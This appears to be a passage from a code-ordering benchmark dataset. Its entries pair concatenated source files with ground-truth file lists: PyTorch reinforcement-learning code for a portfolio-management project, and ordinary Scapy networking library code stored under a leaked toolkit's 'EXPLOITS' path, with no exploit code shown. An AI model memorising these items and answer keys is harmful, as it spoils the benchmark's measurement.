None:\n            w = self.patch_embed.proj.weight.data\n            if self.trunc_init:\n                torch.nn.init.trunc_normal_(w)\n                torch.nn.init.trunc_normal_(self.mask_token, std=0.02)\n            else:\n                torch.nn.init.xavier_uniform_(w.view([w.shape[0], -1]))\n                torch.nn.init.normal_(self.mask_token, std=0.02)\n\n\n        self.apply(self._init_weights)\n\n    def _init_weights(self, m):\n        if isinstance(m, nn.Linear):\n            torch.nn.init.orthogonal_(m.weight, 1.0)\n            if isinstance(m, nn.Linear) and m.bias is not None:\n                nn.init.constant_(m.bias, 1e-6)\n        elif isinstance(m, nn.LayerNorm):\n            nn.init.constant_(m.bias, 0)\n            nn.init.constant_(m.weight, 1.0)\n\n    def forward_encoder(self, x, mask = None, ids_restore = None, if_mask = True):\n\n        x = self.patch_embed(x)\n\n        B, L, C = x.shape\n\n        if if_mask:\n            if mask is None:\n                mask_ratio = self.mask_ratio_generator.rvs(1)[0]\n                x, mask, ids_restore, ids_keep = self.random_masking(x, mask_ratio)\n                x = x.view(B, -1, C)\n            else:\n                ids_keep = torch.argsort(ids_restore, dim=1)[:, :(mask[0, :] == 0).sum().item()]\n                x = torch.gather(x, dim=1, index=ids_keep.unsqueeze(-1).repeat(1, 1, C))\n        else:\n            ids_keep = torch.arange(0, L).unsqueeze(0).repeat(B, 1).to(x.device)\n\n\n        if self.cls_embed:\n            cls_token = self.cls_token\n            cls_tokens = cls_token.expand(x.shape[0], -1, -1)\n            x = torch.cat((cls_tokens, x), dim=1)\n\n\n        if self.sep_pos_embed:\n            pos_embed = self.pos_embed_spatial.repeat(\n                1, self.input_size[0], 1\n            ) + torch.repeat_interleave(\n                self.pos_embed_temporal,\n                self.input_size[1],\n                dim=1,\n            )\n\n            pos_embed = pos_embed.expand(x.shape[0], -1, -1)\n            pos_embed = torch.gather(\n                pos_embed,\n                dim=1,\n                index=ids_keep.unsqueeze(-1).repeat(1, 1, pos_embed.shape[2]),\n            )\n            if self.cls_embed:\n                pos_embed = torch.cat(\n                    [\n                        self.pos_embed_class.expand(pos_embed.shape[0], -1, -1),\n                        pos_embed,\n                    ],\n                    1,\n                )\n        else:\n            if self.cls_embed:\n                cls_ind = 1\n            else:\n                cls_ind = 0\n            pos_embed = self.pos_embed[:, cls_ind:, :].expand(x.shape[0], -1, -1)\n            pos_embed = torch.gather(\n                pos_embed,\n                dim=1,\n                index=ids_keep.unsqueeze(-1).repeat(1, 1, pos_embed.shape[2]),\n            )\n            if self.cls_embed:\n                pos_embed = torch.cat(\n                    [\n                        self.pos_embed[:, :1, :].expand(x.shape[0], -1, -1),\n                        pos_embed,\n                    ],\n                    1,\n                )\n\n        x = x.view([B, -1, C]) + pos_embed\n\n\n        for blk in self.blocks:\n            x = blk(x)\n        x = self.norm(x)\n\n        if self.cls_embed:\n\n            x = x[:, 1:, :]\n        else:\n            x = x[:, :, :]\n\n        return x, mask, ids_restore\n\n    def forward_decoder(self, x, kv, ids_restore):\n        N = x.shape[0]\n        T = self.patch_embed.t_grid_size\n        H = W = self.patch_embed.grid_size\n\n\n        x = self.decoder_embed(x)\n        kv = self.decoder_embed(kv)\n        C = x.shape[-1]\n\n\n        mask_tokens = self.mask_token.repeat(N, T * H * W + 0 - x.shape[1], 1)\n        x_ = torch.cat([x[:, :, :], mask_tokens], dim=1)\n        x_ = x_.view([N, T * H * W, C])\n        x_ = torch.gather(\n            x_, dim=1, index=ids_restore.unsqueeze(-1).repeat(1, 1, x_.shape[2])\n        )\n        x = x_.view([N, T * H * W, C])\n\n\n        if self.cls_embed:\n            decoder_cls_token = self.decoder_cls_token\n            decoder_cls_tokens = decoder_cls_token.expand(x.shape[0], -1, -1)\n            x = torch.cat((decoder_cls_tokens, x), dim=1)\n            kv = torch.cat((decoder_cls_tokens, kv), dim=1)\n\n        if self.sep_pos_embed:\n            decoder_pos_embed = self.decoder_pos_embed_spatial.repeat(\n                1, self.input_size[0], 1\n            ) + torch.repeat_interleave(\n                self.decoder_pos_embed_temporal,\n                self.input_size[1] * self.input_size[2],\n                dim=1,\n            )\n            if self.cls_embed:\n                decoder_pos_embed = torch.cat(\n                    [\n                        self.decoder_pos_embed_class.expand(\n                            decoder_pos_embed.shape[0], -1, -1\n                        ),\n                        decoder_pos_embed,\n                    ],\n                    1,\n                )\n        else:\n            decoder_pos_embed = self.decoder_pos_embed[:, :, :]\n\n\n        x = x + decoder_pos_embed\n\n        attn = self.decoder_blocks[0].attn\n        requires_t_shape = hasattr(attn, \"requires_t_shape\") and attn.requires_t_shape\n        if requires_t_shape:\n            x = x.view([N, T, H * W, C])\n            kv = kv.view([N, T, H * W, C])\n\n        k = v = kv\n\n\n        for blk in self.decoder_blocks:\n            x = blk(x, k, v)\n        x = self.decoder_norm(x)\n\n\n        x = self.decoder_pred(x)\n\n        if requires_t_shape:\n            x = x.view([N, T * H * W, -1])\n\n        if self.cls_embed:\n\n            x = x[:, 1:, :]\n        else:\n            x = x[:, :, :]\n\n        return x\n\n    def forward_state(self,x, mask = None, ids_restore = None):\n        if len(x.shape) == 4:\n            x = x.unsqueeze(1)\n\n        x, mask, ids_restore = self.forward_encoder(x,\n                                                    mask = mask,\n                                                    ids_restore = ids_restore)\n\n        N = x.shape[0]\n        T = self.patch_embed.t_grid_size\n        H = W = self.patch_embed.grid_size\n\n\n        x = self.decoder_embed(x)\n        C = x.shape[-1]\n\n\n        mask_tokens = self.mask_token.repeat(N, T * H * W + 0 - x.shape[1], 1)\n        x_ = torch.cat([x[:, :, :], mask_tokens], dim=1)\n        x_ = x_.view([N, T * H * W, C])\n        x_ = torch.gather(\n            x_, dim=1, index=ids_restore.unsqueeze(-1).repeat(1, 1, x_.shape[2])\n        )\n        x = x_.view([N, T * H * W, C])\n\n\n        if self.cls_embed:\n            decoder_cls_token = self.decoder_cls_token\n            decoder_cls_tokens = decoder_cls_token.expand(x.shape[0], -1, -1)\n            x = torch.cat((decoder_cls_tokens, x), dim=1)\n\n        if self.sep_pos_embed:\n            decoder_pos_embed = self.decoder_pos_embed_spatial.repeat(\n                1, self.input_size[0], 1\n            ) + torch.repeat_interleave(\n                self.decoder_pos_embed_temporal,\n                self.input_size[1] * self.input_size[2],\n                dim=1,\n            )\n            if self.cls_embed:\n                decoder_pos_embed = torch.cat(\n                    [\n                        self.decoder_pos_embed_class.expand(\n                            decoder_pos_embed.shape[0], -1, -1\n                        ),\n                        decoder_pos_embed,\n                    ],\n                    1,\n                )\n        else:\n            decoder_pos_embed = self.decoder_pos_embed[:, :, :]\n\n\n        x = x + decoder_pos_embed\n\n        attn = self.decoder_blocks[0].attn\n        requires_t_shape = hasattr(attn, \"requires_t_shape\") and attn.requires_t_shape\n\n        if requires_t_shape:\n            x = x.view([N, T * H * W, -1])\n\n        if self.cls_embed:\n\n            x = x[:, 1:, :]\n        else:\n            x = x[:, :, :]\n\n        return x, mask, ids_restore\n\n    def forward_loss(self, imgs, pred, mask):\n\n        _imgs = torch.index_select(\n            imgs,\n            2,\n            torch.linspace(\n                0,\n                imgs.shape[2] - 1,\n                self.num_stocks,\n            )\n            .long()\n            .to(imgs.device),\n        )\n\n        target = self.patchify(_imgs)\n\n        if self.norm_pix_loss:\n            mean = target.mean(dim=-1, keepdim=True)\n            var = target.var(dim=-1, keepdim=True)\n            target = (target - mean) / (var + 1.0e-6) ** 0.5\n\n        loss = (pred - target) ** 2\n        loss = loss.mean(dim=-1)\n        mask = mask.view(loss.shape)\n\n        loss = (loss * mask).sum() / mask.sum()\n        return loss\n\n    def forward(self, x, mask = None, ids_restore = None):\n        if len(x.shape) == 4:\n            x = x.unsqueeze(1)\n        latent, mask, ids_restore = self.forward_encoder(x,\n                                                         mask = mask,\n                                                         ids_restore = ids_restore)\n\n        kv = self.forward_encoder(x,if_mask=False)[0]\n\n        pred = self.forward_decoder(latent, kv, ids_restore)\n        loss = self.forward_loss(x, pred, mask)\n        return loss, mask, ids_restore\n\nif __name__ == '__main__':\n    device = torch.device(\"cpu\")\n\n    model = MaskTimeState(\n        feature_size=(10, 102),\n        patch_size=(10, 102),\n        frames=420,\n        t_patch_size=1,\n        input_dim=102,\n        temporal_dim=3,\n        embed_dim=128\n    ).to(device)\n    print(model)\n\n    feature = torch.randn(4, 1, 420, 10, 99)\n    temporal = torch.zeros(4, 1, 420, 10, 3)\n\n    batch = torch.cat([feature, temporal], dim=-1)\n\n    loss, mask, ids_restore = model(batch)\n    print(loss, mask.shape, ids_restore.shape)\n\n    x, mask, ids_restore = model.forward_state(batch)\n    print(x.shape, mask.shape, ids_restore.shape)\n'EarnMore/pm/net/sac/__init__.py'\n:from .sac_net import ActorSAC, CriticSAC\nfrom .mask_sac_net import ActorMaskSAC, CriticMaskSAC\n'EarnMore/pm/net/__init__.py'\n:from .mae import MAE\nfrom .mask_vit_state import MaskVitState\nfrom .mask_time_state import MaskTimeState\nfrom .qnet import QNet\nfrom .qnet import MaskQNet\nfrom .sac import ActorSAC\nfrom .sac import CriticSAC\nfrom .sac import ActorMaskSAC\nfrom .sac import CriticMaskSAC\nfrom .ddpg import ActorDDPG\nfrom .ddpg import CriticDDPG\nfrom .TD3 import ActorTD3\nfrom .TD3 import CriticTD3\nfrom .ppo import ActorPPO\nfrom .ppo import CriticPPO\n\n__all__ = [\n    \"MAE\",\n    \"MaskVitState\",\n    \"MaskTimeState\",\n    \"QNet\",\n    \"MaskQNet\",\n    \"ActorSAC\",\n    \"CriticSAC\",\n    \"ActorPPO\",\n    \"CriticPPO\",\n    \"ActorMaskSAC\",\n    \"CriticMaskSAC\",\n    \"ActorDDPG\",\n    \"CriticDDPG\",\n    \"ActorTD3\",\n    \"CriticTD3\",\n]\n'EarnMore/pm/net/sac/mask_sac_net.py'\n:import torch\nimport torch.nn as nn\nfrom typing import List\nfrom functools import partial\nfrom torch.distributions.normal import Normal\nfrom timm.models.layers import Mlp\nfrom torch.nn import functional as F\nfrom pm.registry import NET\nfrom pm.net import MaskTimeState\n\n@NET.register_module(force=True)\nclass ActorMaskSAC(nn.Module):\n    def __init__(self,\n                *args,\n                embed_dim: int = 128,\n                depth: int = 2,\n                norm_layer: nn.LayerNorm = partial(nn.LayerNorm, eps=1e-6),\n                cls_embed: bool = True,\n                ** kwargs\n                ):\n        super(ActorMaskSAC, self).__init__()\n        self.embed_dim = embed_dim\n        self.norm_layer = norm_layer\n        self.cls_embed = cls_embed\n\n        if self.cls_embed:\n            self.cls_token = nn.Parameter(torch.zeros(1, 1, embed_dim))\n\n        self.blocks = nn.ModuleList(\n            [\n                Mlp(in_features=embed_dim, hidden_features=embed_dim, out_features=embed_dim)\n                for i in range(depth)\n            ]\n        )\n\n        self.norm = norm_layer(embed_dim)\n\n        self.decoder_pred = nn.Linear(\n            embed_dim,\n            2,\n            bias=True,\n        )\n\n        self.initialize_weights()\n\n    def initialize_weights(self):\n        if self.cls_embed:\n            torch.nn.init.trunc_normal_(self.cls_token, std=0.02)\n\n\n        self.apply(self._init_weights)\n\n    def _init_weights(self, m):\n        if isinstance(m, nn.Linear):\n            torch.nn.init.orthogonal_(m.weight, 1.0)\n            if isinstance(m, nn.Linear) and m.bias is not None:\n                nn.init.constant_(m.bias, 1e-6)\n        elif isinstance(m, nn.LayerNorm):\n            nn.init.constant_(m.bias, 0)\n            nn.init.constant_(m.weight, 1.0)\n\n    def forward_encoder(self, x):\n\n\n        if self.cls_embed:\n            cls_token = self.cls_token\n            cls_tokens = cls_token.expand(x.shape[0], -1, -1)\n            x = torch.cat((cls_tokens, x), dim=1)\n\n        for blk in self.blocks:\n            x = blk(x)\n        x = self.norm(x)\n\n        return x\n\n    def forward_decoder(self, x):\n        x = self.decoder_pred(x)\n        return x\n\n    def forward(self, x):\n        latent = self.forward_encoder(x)\n        pred = self.forward_decoder(latent)\n\n        logits = pred[:, :, 0]\n\n        indices = torch.sort(logits)[1]\n        soft_logits = logits * torch.log(indices + 1)\n\n        weight = F.softmax(soft_logits, dim=-1).squeeze(-1)\n\n        return weight\n\n    def get_action(self, x):\n\n        latent = self.forward_encoder(x)\n        pred = self.forward_decoder(latent)\n\n        a_avg, a_std_log = pred.chunk(2, dim=-1)\n        a_std = a_std_log.clamp(-16, 2).exp()\n        a_avg = a_avg.squeeze(-1)\n        a_std = a_std.squeeze(-1)\n\n        dist = Normal(a_avg, a_std)\n\n        logits = dist.rsample()\n        indices = torch.sort(logits)[1]\n        soft_logits = logits * torch.log(indices + 1)\n\n        weight = F.softmax(soft_logits, dim=-1).squeeze(-1)\n\n        return weight\n\n    def get_action_logprob(self, x):\n\n        latent = self.forward_encoder(x)\n        pred = self.forward_decoder(latent)\n\n        a_avg, a_std_log = pred.chunk(2, dim=-1)\n        a_std = a_std_log.clamp(-16, 2).exp()\n        a_avg = a_avg.squeeze(-1)\n        a_std = a_std.squeeze(-1)\n\n        dist = Normal(a_avg, a_std)\n        logits = dist.rsample()\n\n        indices = torch.sort(logits)[1]\n        soft_logits = logits * torch.log(indices + 1)\n\n        weight = F.softmax(soft_logits, dim=-1).squeeze(-1)\n\n        logprob = dist.log_prob(a_avg)\n        logprob -= (-weight.pow(2) + 1.000001).log()\n\n        return weight, logprob.sum(1)\n\n\n@NET.register_module(force=True)\nclass CriticMaskSAC(nn.Module):\n    def __init__(self,\n                 *args,\n                 embed_dim: int = 128,\n                 depth: int = 2,\n                 norm_layer: nn.LayerNorm = partial(nn.LayerNorm, eps=1e-6),\n                 cls_embed: bool = True,\n                 **kwargs\n                 ):\n        super(CriticMaskSAC, self).__init__()\n\n        self.embed_dim = embed_dim\n        self.norm_layer = norm_layer\n        self.cls_embed = cls_embed\n\n        if self.cls_embed:\n            self.cls_token = nn.Parameter(torch.zeros(1, 1, embed_dim))\n\n        self.blocks = nn.ModuleList(\n            [\n                Mlp(in_features=embed_dim + 1, hidden_features=embed_dim + 1, out_features=embed_dim + 1)\n                for i in range(depth)\n            ]\n        )\n\n        self.norm = norm_layer(embed_dim + 1)\n\n        self.decoder_pred = nn.Linear(\n            embed_dim + 1,\n            2,\n            bias=True,\n        )\n\n        self.initialize_weights()\n\n    def initialize_weights(self):\n        if self.cls_embed:\n            torch.nn.init.trunc_normal_(self.cls_token, std=0.02)\n\n\n        self.apply(self._init_weights)\n\n    def _init_weights(self, m):\n        if isinstance(m, nn.Linear):\n            torch.nn.init.orthogonal_(m.weight, 1.0)\n            if isinstance(m, nn.Linear) and m.bias is not None:\n                nn.init.constant_(m.bias, 1e-6)\n        elif isinstance(m, nn.LayerNorm):\n            nn.init.constant_(m.bias, 0)\n            nn.init.constant_(m.weight, 1.0)\n\n\n    def forward_encoder(self, x, action):\n\n        if self.cls_embed:\n            cls_token = self.cls_token\n            cls_tokens = cls_token.expand(x.shape[0], -1, -1)\n            x = torch.cat((cls_tokens, x), dim=1)\n\n        if len(action.shape) == 2:\n            action = action.unsqueeze(-1)\n        x = torch.concat([x, action], dim=-1)\n\n        for blk in self.blocks:\n            x = blk(x)\n        x = self.norm(x)\n\n        return x\n\n    def forward_decoder(self, x):\n        x = self.decoder_pred(x)\n        return x\n\n    def forward(self, x, action):\n\n        latent = self.forward_encoder(x, action)\n        latent = torch.sum(latent, dim=1)\n        pred = self.forward_decoder(latent)\n        value = pred.mean(dim=1)\n        return value\n\n    def get_q_min(self, x, action):\n\n        latent = self.forward_encoder(x, action)\n        latent = torch.sum(latent, dim=1)\n        pred = self.forward_decoder(latent)\n        value = pred.min(dim=1)[0]\n        return value\n\n    def get_q1_q2(self, x, action):\n\n        latent = self.forward_encoder(x, action)\n        latent = torch.sum(latent, dim=1)\n        pred = self.forward_decoder(latent)\n        value = pred\n\n        return value[:, 0], value[:, 1]\n\n\nif __name__ == '__main__':\n    device = torch.device(\"cpu\")\n\n    feature = torch.randn(4 * 4, 420, 10, 99)\n    temporal = torch.zeros(4 * 4, 420, 10, 3)\n\n    batch = torch.cat([feature, temporal], dim=-1).to(device)\n\n    model = MaskTimeState(\n        feature_size=(10, 102),\n        patch_size=(10, 102),\n        frames=420,\n        t_patch_size=1,\n        input_dim=102,\n        temporal_dim=3,\n        embed_dim=128\n    ).to(device)\n    loss, mask, ids_restore = model(batch)\n    print(loss, mask.shape, ids_restore.shape)\n\n    state, mask, ids_restore = model.forward_state(batch, mask, ids_restore)\n    print(state.shape)\n\n    model = ActorMaskSAC(embed_dim=64).to(device)\n    pred = model(state)\n    print(pred.shape)\n\n    action = model.get_action(state)\n    print(action.shape)\n\n    action, action_logprob = model.get_action_logprob(state)\n    print(action.shape, action_logprob.shape)\n\n    action = torch.randn((4*4, 421)).to(device)\n    model = CriticMaskSAC(embed_dim=64).to(device)\n    values = model(state, action)\n    print(values.shape)\n\n    values = model.get_q_min(state, action)\n    print(values.shape)\n\n    values1, values2 = model.get_q1_q2(state, action)\n    print(values1.shape, values2.shape)",
        "gt": [
            "'EarnMore/pm/net/mask_time_state.py'",
            "'EarnMore/pm/net/__init__.py'",
            "'EarnMore/pm/net/sac/mask_sac_net.py'",
            "'EarnMore/pm/net/sac/__init__.py'"
        ]
    },
    {
        "files": [
            "'eqgrp-free-file/Firewall/EXPLOITS/EXBA/scapy/arch/__init__.py'",
            "'eqgrp-free-file/Firewall/EXPLOITS/EXBA/scapy/arch/windows/__init__.py'",
            "'eqgrp-free-file/Firewall/EXPLOITS/EXBA/scapy/all.py'"
        ],
        "content": "'eqgrp-free-file/Firewall/EXPLOITS/EXBA/scapy/arch/__init__.py'\n:\n\n\n\n\n\nimport sys,os,socket\nfrom scapy.error import *\nimport scapy.config\n\ntry:\n    import Gnuplot\n    GNUPLOT=1\nexcept ImportError:\n    log_loading.info(\"Can't import python gnuplot wrapper . Won't be able to plot.\")\n    GNUPLOT=0\n\ntry:\n    import pyx\n    PYX=1\nexcept ImportError:\n    log_loading.info(\"Can't import PyX. Won't be able to use psdump() or pdfdump().\")\n    PYX=0\n\n\ndef str2mac(s):\n    return (\"%02x:\"*6)[:-1] % tuple(map(ord, s))\n\n\n\ndef get_if_addr(iff):\n    return socket.inet_ntoa(get_if_raw_addr(iff))\n\ndef get_if_hwaddr(iff):\n    addrfamily, mac = get_if_raw_hwaddr(iff)\n    if addrfamily in [ARPHDR_ETHER,ARPHDR_LOOPBACK]:\n        return str2mac(mac)\n    else:\n        raise Scapy_Exception(\"Unsupported address family (%i) for interface [%s]\" % (addrfamily,iff))\n\n\nLINUX=sys.platform.startswith(\"linux\")\nOPENBSD=sys.platform.startswith(\"openbsd\")\nFREEBSD=sys.platform.startswith(\"freebsd\")\nNETBSD = sys.platform.startswith(\"netbsd\")\nDARWIN=sys.platform.startswith(\"darwin\")\nSOLARIS=sys.platform.startswith(\"sunos\")\nWINDOWS=sys.platform.startswith(\"win32\")\n\nX86_64 = not WINDOWS and (os.uname()[4] == 'x86_64')\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nif LINUX:\n    from linux import *\n    if scapy.config.conf.use_pcap or scapy.config.conf.use_dnet:\n        from pcapdnet import *\nelif OPENBSD or FREEBSD or NETBSD or DARWIN:\n    from bsd import *\nelif SOLARIS:\n    from solaris import *\nelif WINDOWS:\n    from windows import *\n\nif scapy.config.conf.iface is None:\n    scapy.config.conf.iface = LOOPBACK_NAME\n\n\ndef get_if_raw_addr6(iff):\n\n    r = filter(lambda x: x[2] == iff and x[1] == IPV6_ADDR_GLOBAL, in6_getifaddr())\n    if len(r) == 0:\n        return None\n    else:\n        r = r[0][0]\n    return inet_pton(socket.AF_INET6, r)\n\n'eqgrp-free-file/Firewall/EXPLOITS/EXBA/scapy/arch/windows/__init__.py'\n:\n\n\n\n\nimport os,re,sys,socket,time\nfrom glob import glob\nfrom scapy.config import conf,ConfClass\nfrom scapy.error import Scapy_Exception,log_loading,log_runtime\nfrom scapy.utils import atol, inet_aton, inet_ntoa, PcapReader\nfrom scapy.base_classes import Gen, Net, SetGen\nimport scapy.plist as plist\nfrom scapy.sendrecv import debug, srp1\nfrom scapy.layers.l2 import Ether, ARP\nfrom scapy.data import MTU, ETHER_BROADCAST, ETH_P_ARP\n\nconf.use_pcap = 1\nconf.use_dnet = 1\nfrom scapy.arch import pcapdnet\nfrom scapy.arch.pcapdnet import *\n\nLOOPBACK_NAME=\"lo0\"\nWINDOWS = True\n\n\ndef _where(filename, dirs=[], env=\"PATH\"):\n\n    if not isinstance(dirs, list):\n        dirs = [dirs]\n    if glob(filename):\n        return filename\n    paths = [os.curdir] + os.environ[env].split(os.path.pathsep) + dirs\n    for path in paths:\n        for match in glob(os.path.join(path, filename)):\n            if match:\n                return os.path.normpath(match)\n    raise IOError(\"File not found: %s\" % filename)\n\ndef win_find_exe(filename, installsubdir=None, env=\"ProgramFiles\"):\n\n    for fn in [filename, filename+\".exe\"]:\n        try:\n            if installsubdir is None:\n                path = _where(fn)\n            else:\n                path = _where(fn, dirs=[os.path.join(os.environ[env], installsubdir)])\n        except IOError:\n            path = filename\n        else:\n            break\n    return path\n\n\nclass WinProgPath(ConfClass):\n    _default = \"<System default>\"\n\n    pdfreader = win_find_exe(\"AcroRd32\")\n    psreader = win_find_exe(\"gsview32.exe\", \"Ghostgum/gsview\")\n    dot = win_find_exe(\"dot\", \"ATT/Graphviz/bin\")\n    tcpdump = win_find_exe(\"windump\")\n    tcpreplay = win_find_exe(\"tcpreplay\")\n    display = _default\n    hexedit = win_find_exe(\"hexer\")\n    wireshark = win_find_exe(\"wireshark\", \"wireshark\")\n\nconf.prog = WinProgPath()\n\n\n\nimport _winreg\n\n\n\nclass PcapNameNotFoundError(Scapy_Exception):\n    pass\n\nclass NetworkInterface(object):\n\n\n    def __init__(self, dnetdict=None):\n        self.name = None\n        self.ip = None\n        self.mac = None\n        self.pcap_name = None\n        self.win_name = None\n        self.uuid = None\n        self.dnetdict = dnetdict\n        if dnetdict is not None:\n            self.update(dnetdict)\n\n    def update(self, dnetdict):\n\n        self.name = dnetdict[\"name\"]\n\n        try:\n            self.ip = socket.inet_ntoa(dnetdict[\"addr\"].ip)\n        except (KeyError, AttributeError, NameError):\n            pass\n        try:\n            self.mac = dnetdict[\"link_addr\"]\n        except KeyError:\n            pass\n        self._update_pcapdata()\n\n    def _update_pcapdata(self):\n\n\n\n\n\n\n        for n in range(30):\n            guess = \"eth%s\" % n\n            win_name = pcapdnet.pcap.ex_name(guess)\n            if win_name.endswith(\"}\"):\n                try:\n                    uuid = win_name[win_name.index(\"{\"):win_name.index(\"}\")+1]\n                    keyname = r\"SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces\\%s\" % uuid\n                    try:\n                        key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, keyname)\n                    except WindowsError:\n                        log_loading.debug(\"Couldn't open 'HKEY_LOCAL_MACHINE\\\\%s' (for guessed pcap iface name '%s').\" % (keyname, guess))\n                        continue\n                    try:\n                        fixed_ip = _winreg.QueryValueEx(key, \"IPAddress\")[0][0].encode(\"utf-8\")\n                    except (WindowsError, UnicodeDecodeError, IndexError):\n                        fixed_ip = None\n                    try:\n                        dhcp_ip = _winreg.QueryValueEx(key, \"DhcpIPAddress\")[0].encode(\"utf-8\")\n                    except (WindowsError, UnicodeDecodeError, IndexError):\n                        dhcp_ip = None\n\n\n                    if fixed_ip is not None and fixed_ip != \"0.0.0.0\":\n                        ip = fixed_ip\n                    elif dhcp_ip is not None and dhcp_ip != \"0.0.0.0\":\n                        ip = dhcp_ip\n                    else:\n                        continue\n                except IOError:\n                    continue\n                else:\n                    if ip == self.ip:\n                        self.pcap_name = guess\n                        self.win_name = win_name\n                        self.uuid = uuid\n                        break\n        else:\n            raise PcapNameNotFoundError\n\n    def __repr__(self):\n        return \"<%s: %s %s %s pcap_name=%s win_name=%s>\" % (self.__class__.__name__,\n                     self.name, self.ip, self.mac, self.pcap_name, self.win_name)\n\nfrom UserDict import IterableUserDict\n\nclass NetworkInterfaceDict(IterableUserDict):\n\n\n    def load_from_dnet(self):\n\n        for i in pcapdnet.dnet.intf():\n            try:\n\n\n\n\n                if i[\"name\"].startswith(\"eth\") and \"addr\" in i:\n                    self.data[i[\"name\"]] = NetworkInterface(i)\n            except (KeyError, PcapNameNotFoundError):\n                pass\n        if len(self.data) == 0:\n            log_loading.warning(\"No match between your pcap and dnet network interfaces found. \"\n                                \"You probably won't be able to send packets. \"\n                                \"Deactivating unneeded interfaces and restarting Scapy might help.\")\n\n    def pcap_name(self, devname):\n\n\n        try:\n            pcap_name = self.data[devname].pcap_name\n        except KeyError:\n            raise ValueError(\"Unknown network interface %r\" % devname)\n        else:\n            return pcap_name\n\n    def devname(self, pcap_name):\n\n\n        for devname, iface in self.items():\n            if iface.pcap_name == pcap_name:\n                return iface.name\n        raise ValueError(\"Unknown pypcap network interface %r\" % pcap_name)\n\n    def show(self, resolve_mac=True):\n\n        print \"%s  %s  %s\" % (\"IFACE\".ljust(5), \"IP\".ljust(15), \"MAC\")\n        for iface_name in sorted(self.data.keys()):\n            dev = self.data[iface_name]\n            mac = str(dev.mac)\n            if resolve_mac:\n                mac = conf.manufdb._resolve_MAC(mac)\n            print \"%s  %s  %s\" % (str(dev.name).ljust(5), str(dev.ip).ljust(15), mac)\n\nifaces = NetworkInterfaceDict()\nifaces.load_from_dnet()\n\ndef pcap_name(devname):\n\n    try:\n        pcap_name = ifaces.pcap_name(devname)\n    except ValueError:\n\n        pcap_name = None\n    return pcap_name\n\ndef devname(pcap_name):\n\n    return ifaces.devname(pcap_name)\n\ndef show_interfaces(resolve_mac=True):\n\n    return ifaces.show(resolve_mac)\n\n_orig_open_pcap = pcapdnet.open_pcap\npcapdnet.open_pcap = lambda iface,*args,**kargs: _orig_open_pcap(pcap_name(iface),*args,**kargs)\n\ndef read_routes():\n    ok = 0\n    routes = []\n    ip = '(\\d+\\.\\d+\\.\\d+\\.\\d+)'\n\n\n    gw_pattern = '(.+)'\n    metric_pattern = \"(\\d+)\"\n    delim = \"\\s+\"\n    netstat_line = delim.join([ip, ip, gw_pattern, ip, metric_pattern])\n    pattern = re.compile(netstat_line)\n    f=os.popen(\"netstat -rn\")\n    for l in f.readlines():\n        match = re.search(pattern,l)\n        if match:\n            dest   = match.group(1)\n            mask   = match.group(2)\n            gw     = match.group(3)\n            netif  = match.group(4)\n            metric = match.group(5)\n            try:\n                intf = pcapdnet.dnet.intf().get_dst(pcapdnet.dnet.addr(type=2, addrtxt=dest))\n            except OSError:\n                log_loading.warning(\"Building Scapy's routing table: Couldn't get outgoing interface for destination %s\" % dest)\n                continue\n            if not intf.has_key(\"addr\"):\n                break\n            addr = str(intf[\"addr\"])\n            addr = addr.split(\"/\")[0]\n\n            dest = atol(dest)\n            mask = atol(mask)\n\n            gw_ipmatch = re.search('\\d+\\.\\d+\\.\\d+\\.\\d+', gw)\n            if gw_ipmatch:\n                gw = gw_ipmatch.group(0)\n            else:\n                gw = netif\n            routes.append((dest,mask,gw, str(intf[\"name\"]), addr))\n    f.close()\n    return routes\n\ndef read_routes6():\n    return []\n\ndef getmacbyip(ip, chainCC=0):\n\n    if isinstance(ip,Net):\n        ip = iter(ip).next()\n    tmp = map(ord, inet_aton(ip))\n    if (tmp[0] & 0xf0) == 0xe0:\n        return \"01:00:5e:%.2x:%.2x:%.2x\" % (tmp[1]&0x7f,tmp[2],tmp[3])\n    iff,a,gw = conf.route.route(ip)\n    if ( (iff == LOOPBACK_NAME) or (ip == conf.route.get_if_bcast(iff)) ):\n        return \"ff:ff:ff:ff:ff:ff\"\n\n    ifip = str(pcapdnet.dnet.intf().get(iff)['addr'])\n    if gw != ifip.split('/')[0]:\n        ip = gw\n\n    mac = conf.netcache.arp_cache.get(ip)\n    if mac:\n        return mac\n\n    res = srp1(Ether(dst=ETHER_BROADCAST)/ARP(op=\"who-has\", pdst=ip),\n               type=ETH_P_ARP,\n               iface = iff,\n               timeout=2,\n               verbose=0,\n               chainCC=chainCC,\n               nofilter=1)\n    if res is not None:\n        mac = res.payload.hwsrc\n        conf.netcache.arp_cache[ip] = mac\n        return mac\n    return None\n\nimport scapy.layers.l2\nscapy.layers.l2.getmacbyip = getmacbyip\n\ntry:\n    import readline\n    console = readline.GetOutputFile()\nexcept (ImportError, AttributeError):\n    log_loading.info(\"Could not get readline console. Will not interpret ANSI color codes.\")\nelse:\n    conf.readfunc = readline.rl.readline\n    orig_stdout = sys.stdout\n    sys.stdout = console\n\n\n\n\n\ndef sndrcv(pks, pkt, timeout = 2, inter = 0, verbose=None, chainCC=0, retry=0, multi=0):\n    if not isinstance(pkt, Gen):\n        pkt = SetGen(pkt)\n\n    if verbose is None:\n        verbose = conf.verb\n    debug.recv = plist.PacketList([],\"Unanswered\")\n    debug.sent = plist.PacketList([],\"Sent\")\n    debug.match = plist.SndRcvList([])\n    nbrecv=0\n    ans = []\n\n    all_stimuli = tobesent = [p for p in pkt]\n    notans = len(tobesent)\n\n    hsent={}\n    for i in tobesent:\n        h = i.hashret()\n        if h in hsent:\n            hsent[h].append(i)\n        else:\n            hsent[h] = [i]\n    if retry < 0:\n        retry = -retry\n        autostop=retry\n    else:\n        autostop=0\n\n\n    while retry >= 0:\n        found=0\n\n        if timeout < 0:\n            timeout = None\n\n        pid=1\n        try:\n            if WINDOWS or pid == 0:\n                try:\n                    try:\n                        i = 0\n                        if verbose:\n                            print \"Begin emission:\"\n                        for p in tobesent:\n                            pks.send(p)\n                            i += 1\n                            time.sleep(inter)\n                        if verbose:\n                            print \"Finished to send %i packets.\" % i\n                    except SystemExit:\n                        pass\n                    except KeyboardInterrupt:\n                        pass\n                    except:\n                        log_runtime.exception(\"--- Error sending packets\")\n                        log_runtime.info(\"--- Error sending packets\")\n                finally:\n                    try:\n                        sent_times = [p.sent_time for p in all_stimuli if p.sent_time]\n                    except:\n                        pass\n            if WINDOWS or pid > 0:\n\n                if timeout:\n                    